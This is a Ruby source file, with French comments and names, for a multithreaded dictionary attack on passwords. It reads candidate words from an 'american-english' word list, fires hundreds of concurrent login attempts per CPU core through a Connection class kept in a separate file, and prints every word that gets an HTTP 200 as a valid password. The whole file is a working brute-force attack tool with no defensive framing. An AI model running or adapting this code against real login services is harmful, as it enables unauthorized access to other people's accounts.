# Besoin de la gemme concurrent-ruby
require 'concurrent'
require_relative 'connection'

def attaque(semaphore, mot, valides)
  connection = Connection.new
  semaphore.synchronize do
    return if mot.nil?

    mot.strip!
  end
  statuscode = connection.connecter(mot)
  return if statuscode != 200

  semaphore.synchronize do
    valides.push(mot)
  end
end

# Classe Distributeur
class Distributeur
  NOMBRE_THREAD_PAR_COEUR = 200

  nombre_coeurs = Concurrent.physical_processor_count * NOMBRE_THREAD_PAR_COEUR
  semaphore = Mutex.new
  valides = []

  flux = File.open('american-english', 'r')
  threads = Array[Thread]
  mots = []
  loop do
    nombre_coeurs.times do |index|
      mots[index] = flux.gets
    end
    nombre_coeurs.times do |index|
      threads[index] = Thread.new { attaque semaphore, mots[index], valides }
    end
    nombre_coeurs.times do |index|
      threads[index].join
    end
    break if mots[nombre_coeurs - 1].nil?
  end
  puts 'Mots de passe valides: ' + valides.to_s
end
